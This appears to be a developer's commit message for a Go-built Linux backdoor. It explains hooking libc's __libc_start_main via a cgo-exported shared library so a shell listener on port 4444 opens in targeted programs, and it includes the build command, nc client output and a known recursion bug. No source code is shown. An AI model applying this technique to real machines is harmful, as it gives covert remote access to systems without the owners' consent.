Hook __libc_start_main()
Hook into `main()` from libc, using cgo, so that the backdoor is opened
as soon as the executing program being targeted invokes `main()`.

The comment with the `export` keyword is cgo syntax, and causes the
function to be exported for use by C. Without this, the function cannot
be invoked by the executable being targeted.

See: http://golang.org/cmd/cgo/#hdr-C_references_to_Go

We have to keep the `main()` function, otherwise Go fails to compile the
shared library and returns the following error:

    $ go build -buildmode=c-shared -o backdoor.so main.go
    # command-line-arguments
    runtime.main: call to external function main.main
    runtime.main: main.main: not defined
    runtime.main: undefined: main.main
    $

Note that as-is, the backdoor will fail to execute any commands as
`/usr/bin/env`, which is invoked to find a shell, will also try to call
the our __libc_start_main wrapper. When it does that, `backdoor()` will
return immediately because it can't bind to the socket (as the server is
already running) and the program segfaults, presumably because our
wrapper doesn't continue once `backdoor()` has returned. I'll address
that next.

Example of the client output when `/usr/bin/env` tries to call our
wrapper, as described above:

    vagrant@development:~$ nc localhost 4444
    date
    exit status 1
    2015/08/25 22:55:00 listen tcp :4444: bind: address already in use

    exit status 1
    2015/08/25 22:55:01 listen tcp :4444: bind: address already in use

    exit status 1
    2015/08/25 22:55:02 listen tcp :4444: bind: address already in use

`/usr/bin/env` links to libc:

    $ ldd /usr/bin/env
            linux-vdso.so.1 =>  (0x00007fff63dfe000)
            libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1ce4009000)
            /lib64/ld-linux-x86-64.so.2 (0x00007f1ce43de000)